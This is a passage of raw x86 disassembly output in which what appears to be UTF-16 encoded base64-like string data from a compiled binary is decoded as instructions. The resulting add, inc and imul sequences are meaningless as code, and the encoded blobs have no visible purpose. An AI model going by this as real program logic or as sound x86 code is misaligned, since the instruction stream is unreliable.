  40ac43:	00 75 00             	add    %dh,0x0(%ebp)
  40ac46:	41                   	inc    %ecx
  40ac47:	00 56 00             	add    %dl,0x0(%esi)
  40ac4a:	35 00 4b 00 34       	xor    $0x34004b00,%eax
  40ac4f:	00 5a 00             	add    %bl,0x0(%edx)
  40ac52:	56                   	push   %esi
  40ac53:	00 55 00             	add    %dl,0x0(%ebp)
  40ac56:	41                   	inc    %ecx
  40ac57:	00 79 00             	add    %bh,0x0(%ecx)
  40ac5a:	33 00                	xor    (%eax),%eax
  40ac5c:	4d                   	dec    %ebp
  40ac5d:	00 70 00             	add    %dh,0x0(%eax)
  40ac60:	67 00 36 00 75       	add    %dh,0x7500
  40ac65:	00 47 00             	add    %al,0x0(%edi)
  40ac68:	31 00                	xor    %eax,(%eax)
  40ac6a:	6a 00                	push   $0x0
  40ac6c:	47                   	inc    %edi
  40ac6d:	00 30                	add    %dh,(%eax)
  40ac6f:	00 56 00             	add    %dl,0x0(%esi)
  40ac72:	30 00                	xor    %al,(%eax)
  40ac74:	48                   	dec    %eax
  40ac75:	00 72 00             	add    %dh,0x0(%edx)
  40ac78:	4e                   	dec    %esi
  40ac79:	00 52 00             	add    %dl,0x0(%edx)
  40ac7c:	61                   	popa
  40ac7d:	00 76 00             	add    %dh,0x0(%esi)
  40ac80:	63 00                	arpl   %eax,(%eax)
  40ac82:	4a                   	dec    %edx
  40ac83:	00 56 00             	add    %dl,0x0(%esi)
  40ac86:	39 00                	cmp    %eax,(%eax)
  40ac88:	6b 00 35             	imul   $0x35,(%eax),%eax
  40ac8b:	00 6f 00             	add    %ch,0x0(%edi)
  40ac8e:	6b 00 52             	imul   $0x52,(%eax),%eax
  40ac91:	00 7a 00             	add    %bh,0x0(%edx)
  40ac94:	51                   	push   %ecx
  40ac95:	00 61 00             	add    %ah,0x0(%ecx)
  40ac98:	52                   	push   %edx
  40ac99:	00 7a 00             	add    %bh,0x0(%edx)
  40ac9c:	2f                   	das
  40ac9d:	00 58 00             	add    %bl,0x0(%eax)
  40aca0:	72 00                	jb     0x40aca2
  40aca2:	50                   	push   %eax
  40aca3:	00 4e 00             	add    %cl,0x0(%esi)
  40aca6:	2f                   	das
  40aca7:	00 5a 00             	add    %bl,0x0(%edx)
  40acaa:	4e                   	dec    %esi
  40acab:	00 77 00             	add    %dh,0x0(%edi)
  40acae:	3d 00 00 87 b1       	cmp    $0xb1870000,%eax
  40acb3:	4f                   	dec    %edi
  40acb4:	00 58 00             	add    %bl,0x0(%eax)
  40acb7:	79 00                	jns    0x40acb9
  40acb9:	69 00 43 00 63 00    	imul   $0x630043,(%eax),%eax
  40acbf:	69 00 62 00 63 00    	imul   $0x630062,(%eax),%eax
  40acc5:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  40acc9:	36 00 30             	add    %dh,%ss:(%eax)
  40accc:	00 72 00             	add    %dh,0x0(%edx)
  40accf:	4a                   	dec    %edx
  40acd0:	00 63 00             	add    %ah,0x0(%ebx)
  40acd3:	53                   	push   %ebx
  40acd4:	00 79 00             	add    %bh,0x0(%ecx)
  40acd7:	61                   	popa
  40acd8:	00 2b                	add    %ch,(%ebx)
  40acda:	00 4d 00             	add    %cl,0x0(%ebp)
  40acdd:	46                   	inc    %esi
  40acde:	00 59 00             	add    %bl,0x0(%ecx)
  40ace1:	47                   	inc    %edi
  40ace2:	00 54 00 56          	add    %dl,0x56(%eax,%eax,1)
  40ace6:	00 42 00             	add    %al,0x0(%edx)
  40ace9:	50                   	push   %eax
  40acea:	00 38                	add    %bh,(%eax)
  40acec:	00 32                	add    %dh,(%edx)
  40acee:	00 52 00             	add    %dl,0x0(%edx)
  40acf1:	4f                   	dec    %edi
  40acf2:	00 73 00             	add    %dh,0x0(%ebx)
  40acf5:	41                   	inc    %ecx
  40acf6:	00 37                	add    %dh,(%edi)
  40acf8:	00 69 00             	add    %ch,0x0(%ecx)
  40acfb:	77 00                	ja     0x40acfd
  40acfd:	6a 00                	push   $0x0
  40acff:	4a                   	dec    %edx
  40ad00:	00 4d 00             	add    %cl,0x0(%ebp)
  40ad03:	70 00                	jo     0x40ad05
  40ad05:	62 00                	bound  %eax,(%eax)
  40ad07:	4b                   	dec    %ebx
  40ad08:	00 63 00             	add    %ah,0x0(%ebx)
  40ad0b:	30 00                	xor    %al,(%eax)
  40ad0d:	71 00                	jno    0x40ad0f
  40ad0f:	36 00 39             	add    %bh,%ss:(%ecx)
  40ad12:	00 57 00             	add    %dl,0x0(%edi)
  40ad15:	31 00                	xor    %eax,(%eax)
  40ad17:	67 00 4b 00          	add    %cl,0x0(%bp,%di)
  40ad1b:	75 00                	jne    0x40ad1d
  40ad1d:	63 00                	arpl   %eax,(%eax)
  40ad1f:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad20:	00 76 00             	add    %dh,0x0(%esi)
  40ad23:	6a 00                	push   $0x0
  40ad25:	58                   	pop    %eax
  40ad26:	00 5a 00             	add    %bl,0x0(%edx)
  40ad29:	55                   	push   %ebp
  40ad2a:	00 67 00             	add    %ah,0x0(%edi)
  40ad2d:	42                   	inc    %edx
  40ad2e:	00 4b 00             	add    %cl,0x0(%ebx)
  40ad31:	56                   	push   %esi
  40ad32:	00 5a 00             	add    %bl,0x0(%edx)
  40ad35:	73 00                	jae    0x40ad37
  40ad37:	43                   	inc    %ebx
  40ad38:	00 33                	add    %dh,(%ebx)
  40ad3a:	00 2f                	add    %ch,(%edi)
  40ad3c:	00 72 00             	add    %dh,0x0(%edx)
  40ad3f:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad40:	00 6f 00             	add    %ch,0x0(%edi)
  40ad43:	68 00 51 00 6d       	push   $0x6d005100
  40ad48:	00 65 00             	add    %ah,0x0(%ebp)
  40ad4b:	51                   	push   %ecx
  40ad4c:	00 73 00             	add    %dh,0x0(%ebx)
  40ad4f:	4a                   	dec    %edx
  40ad50:	00 58 00             	add    %bl,0x0(%eax)
  40ad53:	6a 00                	push   $0x0
  40ad55:	6b 00 2f             	imul   $0x2f,(%eax),%eax
  40ad58:	00 59 00             	add    %bl,0x0(%ecx)
  40ad5b:	51                   	push   %ecx
  40ad5c:	00 67 00             	add    %ah,0x0(%edi)
  40ad5f:	34 00                	xor    $0x0,%al
  40ad61:	7a 00                	jp     0x40ad63
  40ad63:	2f                   	das
  40ad64:	00 54 00 36          	add    %dl,0x36(%eax,%eax,1)
  40ad68:	00 70 00             	add    %dh,0x0(%eax)
  40ad6b:	49                   	dec    %ecx
  40ad6c:	00 38                	add    %bh,(%eax)
  40ad6e:	00 71 00             	add    %dh,0x0(%ecx)
  40ad71:	67 00 48 00          	add    %cl,0x0(%bx,%si)
  40ad75:	4e                   	dec    %esi
  40ad76:	00 49 00             	add    %cl,0x0(%ecx)
  40ad79:	4f                   	dec    %edi
  40ad7a:	00 69 00             	add    %ch,0x0(%ecx)
  40ad7d:	76 00                	jbe    0x40ad7f
  40ad7f:	4f                   	dec    %edi
  40ad80:	00 37                	add    %dh,(%edi)
  40ad82:	00 61 00             	add    %ah,0x0(%ecx)
  40ad85:	61                   	popa
  40ad86:	00 6b 00             	add    %ch,0x0(%ebx)
  40ad89:	78 00                	js     0x40ad8b
  40ad8b:	44                   	inc    %esp
  40ad8c:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad8f:	77 00                	ja     0x40ad91
  40ad91:	33 00                	xor    (%eax),%eax
  40ad93:	31 00                	xor    %eax,(%eax)
  40ad95:	6c                   	insb   (%dx),%es:(%edi)
  40ad96:	00 48 00             	add    %cl,0x0(%eax)
  40ad99:	57                   	push   %edi
  40ad9a:	00 37                	add    %dh,(%edi)
  40ad9c:	00 31                	add    %dh,(%ecx)
  40ad9e:	00 4e 00             	add    %cl,0x0(%esi)
  40ada1:	50                   	push   %eax
  40ada2:	00 61 00             	add    %ah,0x0(%ecx)
  40ada5:	44                   	inc    %esp
  40ada6:	00 6e 00             	add    %ch,0x0(%esi)
  40ada9:	6b 00 48             	imul   $0x48,(%eax),%eax
  40adac:	00 68 00             	add    %ch,0x0(%eax)
  40adaf:	6c                   	insb   (%dx),%es:(%edi)
  40adb0:	00 63 00             	add    %ah,0x0(%ebx)
  40adb3:	37                   	aaa
  40adb4:	00 37                	add    %dh,(%edi)
  40adb6:	00 37                	add    %dh,(%edi)
  40adb8:	00 6e 00             	add    %ch,0x0(%esi)
  40adbb:	55                   	push   %ebp
  40adbc:	00 4a 00             	add    %cl,0x0(%edx)
  40adbf:	63 00                	arpl   %eax,(%eax)
  40adc1:	44                   	inc    %esp
  40adc2:	00 5a 00             	add    %bl,0x0(%edx)
  40adc5:	74 00                	je     0x40adc7
  40adc7:	51                   	push   %ecx
  40adc8:	00 46 00             	add    %al,0x0(%esi)
  40adcb:	30 00                	xor    %al,(%eax)
  40adcd:	50                   	push   %eax
  40adce:	00 38                	add    %bh,(%eax)
  40add0:	00 61 00             	add    %ah,0x0(%ecx)
  40add3:	69 00 44 00 4c 00    	imul   $0x4c0044,(%eax),%eax
  40add9:	6c                   	insb   (%dx),%es:(%edi)
  40adda:	00 49 00             	add    %cl,0x0(%ecx)
  40addd:	46                   	inc    %esi
  40adde:	00 48 00             	add    %cl,0x0(%eax)
  40ade1:	72 00                	jb     0x40ade3
  40ade3:	4f                   	dec    %edi
  40ade4:	00 45 00             	add    %al,0x0(%ebp)
  40ade7:	6f                   	outsl  %ds:(%esi),(%dx)
  40ade8:	00 39                	add    %bh,(%ecx)
  40adea:	00 76 00             	add    %dh,0x0(%esi)
  40aded:	6d                   	insl   (%dx),%es:(%edi)
  40adee:	00 47 00             	add    %al,0x0(%edi)
  40adf1:	67 00 6d 00          	add    %ch,0x0(%di)
  40adf5:	71 00                	jno    0x40adf7
  40adf7:	52                   	push   %edx
  40adf8:	00 6b 00             	add    %ch,0x0(%ebx)
  40adfb:	45                   	inc    %ebp
  40adfc:	00 35 00 48 00 7a    	add    %dh,0x7a004800
  40ae02:	00 4a 00             	add    %cl,0x0(%edx)
  40ae05:	77 00                	ja     0x40ae07
  40ae07:	79 00                	jns    0x40ae09
  40ae09:	4a                   	dec    %edx
  40ae0a:	00 77 00             	add    %dh,0x0(%edi)
  40ae0d:	55                   	push   %ebp
  40ae0e:	00 65 00             	add    %ah,0x0(%ebp)
  40ae11:	56                   	push   %esi
  40ae12:	00 70 00             	add    %dh,0x0(%eax)
  40ae15:	34 00                	xor    $0x0,%al
  40ae17:	44                   	inc    %esp
  40ae18:	00 57 00             	add    %dl,0x0(%edi)
  40ae1b:	30 00                	xor    %al,(%eax)
  40ae1d:	63 00                	arpl   %eax,(%eax)
  40ae1f:	5a                   	pop    %edx
  40ae20:	00 37                	add    %dh,(%edi)
  40ae22:	00 6e 00             	add    %ch,0x0(%esi)
  40ae25:	32 00                	xor    (%eax),%al
  40ae27:	58                   	pop    %eax
  40ae28:	00 49 00             	add    %cl,0x0(%ecx)
  40ae2b:	6d                   	insl   (%dx),%es:(%edi)
  40ae2c:	00 6d 00             	add    %ch,0x0(%ebp)
  40ae2f:	37                   	aaa
  40ae30:	00 72 00             	add    %dh,0x0(%edx)
  40ae33:	42                   	inc    %edx
  40ae34:	00 53 00             	add    %dl,0x0(%ebx)
  40ae37:	4b                   	dec    %ebx
  40ae38:	00 48 00             	add    %cl,0x0(%eax)
  40ae3b:	4a                   	dec    %edx
  40ae3c:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae3f:	4c                   	dec    %esp
  40ae40:	00 66 00             	add    %ah,0x0(%esi)
  40ae43:	72 00                	jb     0x40ae45
  40ae45:	50                   	push   %eax
  40ae46:	00 6f 00             	add    %ch,0x0(%edi)
  40ae49:	71 00                	jno    0x40ae4b
  40ae4b:	2b 00                	sub    (%eax),%eax
  40ae4d:	57                   	push   %edi
  40ae4e:	00 71 00             	add    %dh,0x0(%ecx)
  40ae51:	73 00                	jae    0x40ae53
  40ae53:	65 00 74 00 47       	add    %dh,%gs:0x47(%eax,%eax,1)
  40ae58:	00 47 00             	add    %al,0x0(%edi)
  40ae5b:	78 00                	js     0x40ae5d
  40ae5d:	56                   	push   %esi
  40ae5e:	00 71 00             	add    %dh,0x0(%ecx)
  40ae61:	61                   	popa
  40ae62:	00 4d 00             	add    %cl,0x0(%ebp)
  40ae65:	58                   	pop    %eax
  40ae66:	00 6d 00             	add    %ch,0x0(%ebp)
  40ae69:	53                   	push   %ebx
  40ae6a:	00 79 00             	add    %bh,0x0(%ecx)
  40ae6d:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae6e:	00 46 00             	add    %al,0x0(%esi)
  40ae71:	74 00                	je     0x40ae73
  40ae73:	4b                   	dec    %ebx
  40ae74:	00 55 00             	add    %dl,0x0(%ebp)
  40ae77:	54                   	push   %esp
  40ae78:	00 48 00             	add    %cl,0x0(%eax)
  40ae7b:	78 00                	js     0x40ae7d
  40ae7d:	72 00                	jb     0x40ae7f
  40ae7f:	5a                   	pop    %edx
  40ae80:	00 49 00             	add    %cl,0x0(%ecx)
  40ae83:	57                   	push   %edi
  40ae84:	00 35 00 45 00 7a    	add    %dh,0x7a004500
  40ae8a:	00 49 00             	add    %cl,0x0(%ecx)
  40ae8d:	59                   	pop    %ecx
  40ae8e:	00 79 00             	add    %bh,0x0(%ecx)
  40ae91:	55                   	push   %ebp
  40ae92:	00 55 00             	add    %dl,0x0(%ebp)
  40ae95:	4b                   	dec    %ebx
  40ae96:	00 4f 00             	add    %cl,0x0(%edi)
  40ae99:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae9a:	00 71 00             	add    %dh,0x0(%ecx)
  40ae9d:	2f                   	das
  40ae9e:	00 73 00             	add    %dh,0x0(%ebx)
  40aea1:	53                   	push   %ebx
  40aea2:	00 47 00             	add    %al,0x0(%edi)
  40aea5:	6a 00                	push   $0x0
  40aea7:	70 00                	jo     0x40aea9
  40aea9:	67 00 64 00          	add    %ah,0x0(%si)
  40aead:	59                   	pop    %ecx
  40aeae:	00 49 00             	add    %cl,0x0(%ecx)
  40aeb1:	33 00                	xor    (%eax),%eax
  40aeb3:	33 00                	xor    (%eax),%eax
  40aeb5:	42                   	inc    %edx
  40aeb6:	00 63 00             	add    %ah,0x0(%ebx)
  40aeb9:	7a 00                	jp     0x40aebb
  40aebb:	49                   	dec    %ecx
  40aebc:	00 54 00 43          	add    %dl,0x43(%eax,%eax,1)
  40aec0:	00 2f                	add    %ch,(%edi)
  40aec2:	00 35 00 32 00 34    	add    %dh,0x34003200
  40aec8:	00 70 00             	add    %dh,0x0(%eax)
  40aecb:	48                   	dec    %eax
  40aecc:	00 36                	add    %dh,(%esi)
  40aece:	00 53 00             	add    %dl,0x0(%ebx)
  40aed1:	32 00                	xor    (%eax),%al
  40aed3:	4d                   	dec    %ebp
  40aed4:	00 63 00             	add    %ah,0x0(%ebx)
  40aed7:	7a 00                	jp     0x40aed9
  40aed9:	62 00                	bound  %eax,(%eax)
  40aedb:	67 00 6a 00          	add    %ch,0x0(%bp,%si)
  40aedf:	71 00                	jno    0x40aee1
  40aee1:	33 00                	xor    (%eax),%eax
  40aee3:	30 00                	xor    %al,(%eax)
  40aee5:	79 00                	jns    0x40aee7
  40aee7:	42                   	inc    %edx
  40aee8:	00 68 00             	add    %ch,0x0(%eax)
  40aeeb:	76 00                	jbe    0x40aeed
  40aeed:	59                   	pop    %ecx
  40aeee:	00 6e 00             	add    %ch,0x0(%esi)
  40aef1:	6f                   	outsl  %ds:(%esi),(%dx)
  40aef2:	00 4b 00             	add    %cl,0x0(%ebx)
  40aef5:	35 00 74 00 6f       	xor    $0x6f007400,%eax
  40aefa:	00 37                	add    %dh,(%edi)
  40aefc:	00 76 00             	add    %dh,0x0(%esi)
  40aeff:	31 00                	xor    %eax,(%eax)
  40af01:	34 00                	xor    $0x0,%al
  40af03:	37                   	aaa
  40af04:	00 6b 00             	add    %ch,0x0(%ebx)
  40af07:	58                   	pop    %eax
  40af08:	00 33                	add    %dh,(%ebx)
  40af0a:	00 4a 00             	add    %cl,0x0(%edx)
  40af0d:	5a                   	pop    %edx
  40af0e:	00 4d 00             	add    %cl,0x0(%ebp)
  40af11:	6d                   	insl   (%dx),%es:(%edi)
  40af12:	00 4d 00             	add    %cl,0x0(%ebp)
  40af15:	7a 00                	jp     0x40af17
  40af17:	42                   	inc    %edx
  40af18:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af1b:	58                   	pop    %eax
  40af1c:	00 74 00 57          	add    %dh,0x57(%eax,%eax,1)
  40af20:	00 4a 00             	add    %cl,0x0(%edx)
  40af23:	62 00                	bound  %eax,(%eax)
  40af25:	74 00                	je     0x40af27
  40af27:	4a                   	dec    %edx
  40af28:	00 78 00             	add    %bh,0x0(%eax)
  40af2b:	59                   	pop    %ecx
  40af2c:	00 33                	add    %dh,(%ebx)
  40af2e:	00 69 00             	add    %ch,0x0(%ecx)
  40af31:	69 00 38 00 4d 00    	imul   $0x4d0038,(%eax),%eax
  40af37:	37                   	aaa
  40af38:	00 67 00             	add    %ah,0x0(%edi)
  40af3b:	52                   	push   %edx
  40af3c:	00 4b 00             	add    %cl,0x0(%ebx)
  40af3f:	35 00 39 00 4b       	xor    $0x4b003900,%eax
  40af44:	00 38                	add    %bh,(%eax)
  40af46:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  40af4a:	00 62 00             	add    %ah,0x0(%edx)
  40af4d:	72 00                	jb     0x40af4f
  40af4f:	41                   	inc    %ecx
  40af50:	00 57 00             	add    %dl,0x0(%edi)
  40af53:	68 00 35 00 70       	push   $0x70003500
  40af58:	00 35 00 6d 00 6d    	add    %dh,0x6d006d00
  40af5e:	00 35 00 6d 00 79    	add    %dh,0x79006d00
  40af64:	00 55 00             	add    %dl,0x0(%ebp)
  40af67:	48                   	dec    %eax
  40af68:	00 2f                	add    %ch,(%edi)
  40af6a:	00 4b 00             	add    %cl,0x0(%ebx)
  40af6d:	6e                   	outsb  %ds:(%esi),(%dx)
  40af6e:	00 43 00             	add    %al,0x0(%ebx)
  40af71:	73 00                	jae    0x40af73
  40af73:	73 00                	jae    0x40af75
  40af75:	42                   	inc    %edx
  40af76:	00 61 00             	add    %ah,0x0(%ecx)
  40af79:	4b                   	dec    %ebx
  40af7a:	00 30                	add    %dh,(%eax)
  40af7c:	00 6a 00             	add    %ch,0x0(%edx)
  40af7f:	70 00                	jo     0x40af81
  40af81:	59                   	pop    %ecx
  40af82:	00 56 00             	add    %dl,0x0(%esi)
  40af85:	52                   	push   %edx
  40af86:	00 61 00             	add    %ah,0x0(%ecx)
  40af89:	57                   	push   %edi
  40af8a:	00 70 00             	add    %dh,0x0(%eax)
  40af8d:	7a 00                	jp     0x40af8f
  40af8f:	75 00                	jne    0x40af91
  40af91:	4d                   	dec    %ebp
  40af92:	00 4b 00             	add    %cl,0x0(%ebx)
  40af95:	48                   	dec    %eax
  40af96:	00 75 00             	add    %dh,0x0(%ebp)
  40af99:	59                   	pop    %ecx
  40af9a:	00 31                	add    %dh,(%ecx)
  40af9c:	00 49 00             	add    %cl,0x0(%ecx)
  40af9f:	61                   	popa
  40afa0:	00 74 00 62          	add    %dh,0x62(%eax,%eax,1)
  40afa4:	00 2f                	add    %ch,(%edi)
  40afa6:	00 43 00             	add    %al,0x0(%ebx)
  40afa9:	68 00 2f 00 54       	push   $0x54002f00
  40afae:	00 53 00             	add    %dl,0x0(%ebx)
  40afb1:	37                   	aaa
  40afb2:	00 4d 00             	add    %cl,0x0(%ebp)
  40afb5:	6b 00 4c             	imul   $0x4c,(%eax),%eax
  40afb8:	00 30                	add    %dh,(%eax)
  40afba:	00 79 00             	add    %bh,0x0(%ecx)
  40afbd:	44                   	inc    %esp
  40afbe:	00 6a 00             	add    %ch,0x0(%edx)
  40afc1:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  40afc5:	6d                   	insl   (%dx),%es:(%edi)
  40afc6:	00 4c 00 2b          	add    %cl,0x2b(%eax,%eax,1)
  40afca:	00 56 00             	add    %dl,0x0(%esi)
  40afcd:	37                   	aaa
  40afce:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40afd2:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40afd6:	00 74 00 67          	add    %dh,0x67(%eax,%eax,1)
  40afda:	00 2f                	add    %ch,(%edi)
  40afdc:	00 56 00             	add    %dl,0x0(%esi)
  40afdf:	2f                   	das
  40afe0:	00 41 00             	add    %al,0x0(%ecx)
  40afe3:	51                   	push   %ecx
  40afe4:	00 56 00             	add    %dl,0x0(%esi)
  40afe7:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40afeb:	4e                   	dec    %esi
  40afec:	00 62 00             	add    %ah,0x0(%edx)
  40afef:	70 00                	jo     0x40aff1
  40aff1:	38 00                	cmp    %al,(%eax)
  40aff3:	66 00 71 00          	data16 add %dh,0x0(%ecx)
  40aff7:	44                   	inc    %esp
  40aff8:	00 37                	add    %dh,(%edi)
  40affa:	00 34 00             	add    %dh,(%eax,%eax,1)
  40affd:	58                   	pop    %eax
  40affe:	00 7a 00             	add    %bh,0x0(%edx)
  40b001:	38 00                	cmp    %al,(%eax)
  40b003:	6c                   	insb   (%dx),%es:(%edi)
  40b004:	00 71 00             	add    %dh,0x0(%ecx)
  40b007:	53                   	push   %ebx
  40b008:	00 4a 00             	add    %cl,0x0(%edx)
  40b00b:	71 00                	jno    0x40b00d
  40b00d:	56                   	push   %esi
  40b00e:	00 31                	add    %dh,(%ecx)
  40b010:	00 65 00             	add    %ah,0x0(%ebp)
  40b013:	4c                   	dec    %esp
  40b014:	00 61 00             	add    %ah,0x0(%ecx)
  40b017:	62 00                	bound  %eax,(%eax)
  40b019:	5a                   	pop    %edx
  40b01a:	00 77 00             	add    %dh,0x0(%edi)
  40b01d:	56                   	push   %esi
  40b01e:	00 73 00             	add    %dh,0x0(%ebx)
  40b021:	70 00                	jo     0x40b023
  40b023:	52                   	push   %edx
  40b024:	00 39                	add    %bh,(%ecx)
  40b026:	00 70 00             	add    %dh,0x0(%eax)
  40b029:	71 00                	jno    0x40b02b
  40b02b:	4e                   	dec    %esi
  40b02c:	00 47 00             	add    %al,0x0(%edi)
  40b02f:	6c                   	insb   (%dx),%es:(%edi)
  40b030:	00 54 00 78          	add    %dl,0x78(%eax,%eax,1)
  40b034:	00 48 00             	add    %cl,0x0(%eax)
  40b037:	35 00 74 00 52       	xor    $0x52007400,%eax
  40b03c:	00 47 00             	add    %al,0x0(%edi)
  40b03f:	32 00                	xor    (%eax),%al
  40b041:	72 00                	jb     0x40b043
  40b043:	6f                   	outsl  %ds:(%esi),(%dx)
  40b044:	00 79 00             	add    %bh,0x0(%ecx)
  40b047:	61                   	popa
  40b048:	00 2b                	add    %ch,(%ebx)
  40b04a:	00 54 00 6c          	add    %dl,0x6c(%eax,%eax,1)
  40b04e:	00 4b 00             	add    %cl,0x0(%ebx)
  40b051:	51                   	push   %ecx
  40b052:	00 6f 00             	add    %ch,0x0(%edi)
  40b055:	44                   	inc    %esp
  40b056:	00 43 00             	add    %al,0x0(%ebx)
  40b059:	6c                   	insb   (%dx),%es:(%edi)
  40b05a:	00 38                	add    %bh,(%eax)
  40b05c:	00 48 00             	add    %cl,0x0(%eax)
  40b05f:	58                   	pop    %eax
  40b060:	00 41 00             	add    %al,0x0(%ecx)
  40b063:	74 00                	je     0x40b065
  40b065:	65 00 59 00          	add    %bl,%gs:0x0(%ecx)
  40b069:	73 00                	jae    0x40b06b
  40b06b:	72 00                	jb     0x40b06d
  40b06d:	52                   	push   %edx
  40b06e:	00 62 00             	add    %ah,0x0(%edx)
  40b071:	65 00 41 00          	add    %al,%gs:0x0(%ecx)
  40b075:	6c                   	insb   (%dx),%es:(%edi)
  40b076:	00 67 00             	add    %ah,0x0(%edi)
  40b079:	33 00                	xor    (%eax),%eax
  40b07b:	4a                   	dec    %edx
  40b07c:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
  40b080:	00 52 00             	add    %dl,0x0(%edx)
  40b083:	63 00                	arpl   %eax,(%eax)
  40b085:	66 00 5a 00          	data16 add %bl,0x0(%edx)
  40b089:	2b 00                	sub    (%eax),%eax
  40b08b:	30 00                	xor    %al,(%eax)
  40b08d:	37                   	aaa
  40b08e:	00 44 00 64          	add    %al,0x64(%eax,%eax,1)
  40b092:	00 46 00             	add    %al,0x0(%esi)
  40b095:	7a 00                	jp     0x40b097
  40b097:	79 00                	jns    0x40b099
  40b099:	35 00 51 00 41       	xor    $0x41005100,%eax
  40b09e:	00 6f 00             	add    %ch,0x0(%edi)
  40b0a1:	79 00                	jns    0x40b0a3
  40b0a3:	32 00                	xor    (%eax),%al
  40b0a5:	70 00                	jo     0x40b0a7
  40b0a7:	45                   	inc    %ebp
  40b0a8:	00 2f                	add    %ch,(%edi)
  40b0aa:	00 32                	add    %dh,(%edx)
  40b0ac:	00 43 00             	add    %al,0x0(%ebx)
  40b0af:	2b 00                	sub    (%eax),%eax
  40b0b1:	32 00                	xor    (%eax),%al
  40b0b3:	46                   	inc    %esi
  40b0b4:	00 30                	add    %dh,(%eax)
  40b0b6:	00 54 00 39          	add    %dl,0x39(%eax,%eax,1)
  40b0ba:	00 7a 00             	add    %bh,0x0(%edx)
  40b0bd:	35 00 78 00 6c       	xor    $0x6c007800,%eax
  40b0c2:	00 75 00             	add    %dh,0x0(%ebp)
  40b0c5:	68 00 55 00 61       	push   $0x61005500
  40b0ca:	00 4e 00             	add    %cl,0x0(%esi)
  40b0cd:	69 00 65 00 57 00    	imul   $0x570065,(%eax),%eax
  40b0d3:	47                   	inc    %edi
  40b0d4:	00 30                	add    %dh,(%eax)
  40b0d6:	00 63 00             	add    %ah,0x0(%ebx)
  40b0d9:	31 00                	xor    %eax,(%eax)
  40b0db:	42                   	inc    %edx
  40b0dc:	00 6f 00             	add    %ch,0x0(%edi)
  40b0df:	4f                   	dec    %edi
  40b0e0:	00 62 00             	add    %ah,0x0(%edx)
  40b0e3:	69 00 45 00 33 00    	imul   $0x330045,(%eax),%eax
  40b0e9:	78 00                	js     0x40b0eb
  40b0eb:	33 00                	xor    (%eax),%eax
  40b0ed:	38 00                	cmp    %al,(%eax)
  40b0ef:	6b 00 78             	imul   $0x78,(%eax),%eax
  40b0f2:	00 6d 00             	add    %ch,0x0(%ebp)
  40b0f5:	69 00 62 00 49 00    	imul   $0x490062,(%eax),%eax
  40b0fb:	74 00                	je     0x40b0fd
  40b0fd:	50                   	push   %eax
  40b0fe:	00 42 00             	add    %al,0x0(%edx)
  40b101:	65 00 54 00 6b       	add    %dl,%gs:0x6b(%eax,%eax,1)
  40b106:	00 67 00             	add    %ah,0x0(%edi)
  40b109:	32 00                	xor    (%eax),%al
  40b10b:	31 00                	xor    %eax,(%eax)
  40b10d:	53                   	push   %ebx
  40b10e:	00 4d 00             	add    %cl,0x0(%ebp)
  40b111:	31 00                	xor    %eax,(%eax)
  40b113:	53                   	push   %ebx
  40b114:	00 79 00             	add    %bh,0x0(%ecx)
  40b117:	77 00                	ja     0x40b119
  40b119:	79 00                	jns    0x40b11b
  40b11b:	76 00                	jbe    0x40b11d
  40b11d:	4d                   	dec    %ebp
  40b11e:	00 7a 00             	add    %bh,0x0(%edx)
  40b121:	50                   	push   %eax
  40b122:	00 2b                	add    %ch,(%ebx)
  40b124:	00 42 00             	add    %al,0x0(%edx)
  40b127:	76 00                	jbe    0x40b129
  40b129:	6e                   	outsb  %ds:(%esi),(%dx)
  40b12a:	00 57 00             	add    %dl,0x0(%edi)
  40b12d:	4a                   	dec    %edx
  40b12e:	00 33                	add    %dh,(%ebx)
  40b130:	00 6b 00             	add    %ch,0x0(%ebx)
  40b133:	71 00                	jno    0x40b135
  40b135:	57                   	push   %edi
  40b136:	00 4f 00             	add    %cl,0x0(%edi)
  40b139:	4d                   	dec    %ebp
  40b13a:	00 6b 00             	add    %ch,0x0(%ebx)
  40b13d:	4d                   	dec    %ebp
  40b13e:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  40b142:	00 5a 00             	add    %bl,0x0(%edx)
  40b145:	71 00                	jno    0x40b147
  40b147:	62 00                	bound  %eax,(%eax)
  40b149:	6f                   	outsl  %ds:(%esi),(%dx)
  40b14a:	00 6b 00             	add    %ch,0x0(%ebx)
  40b14d:	30 00                	xor    %al,(%eax)
  40b14f:	44                   	inc    %esp
  40b150:	00 45 00             	add    %al,0x0(%ebp)
  40b153:	6e                   	outsb  %ds:(%esi),(%dx)
  40b154:	00 46 00             	add    %al,0x0(%esi)
  40b157:	4b                   	dec    %ebx
  40b158:	00 72 00             	add    %dh,0x0(%edx)
  40b15b:	37                   	aaa
  40b15c:	00 75 00             	add    %dh,0x0(%ebp)
  40b15f:	69 00 56 00 30 00    	imul   $0x300056,(%eax),%eax
  40b165:	39 00                	cmp    %eax,(%eax)
  40b167:	75 00                	jne    0x40b169
  40b169:	48                   	dec    %eax
  40b16a:	00 2b                	add    %ch,(%ebx)
  40b16c:	00 6c 00 58          	add    %ch,0x58(%eax,%eax,1)
  40b170:	00 68 00             	add    %ch,0x0(%eax)
  40b173:	35 00 4e 00 32       	xor    $0x32004e00,%eax
  40b178:	00 51 00             	add    %dl,0x0(%ecx)
  40b17b:	50                   	push   %eax
  40b17c:	00 35 00 47 00 53    	add    %dh,0x53004700
  40b182:	00 31                	add    %dh,(%ecx)
  40b184:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b187:	41                   	inc    %ecx
  40b188:	00 71 00             	add    %dh,0x0(%ecx)
  40b18b:	78 00                	js     0x40b18d
  40b18d:	74 00                	je     0x40b18f
  40b18f:	4d                   	dec    %ebp
  40b190:	00 51 00             	add    %dl,0x0(%ecx)
  40b193:	65 00 36             	add    %dh,%gs:(%esi)
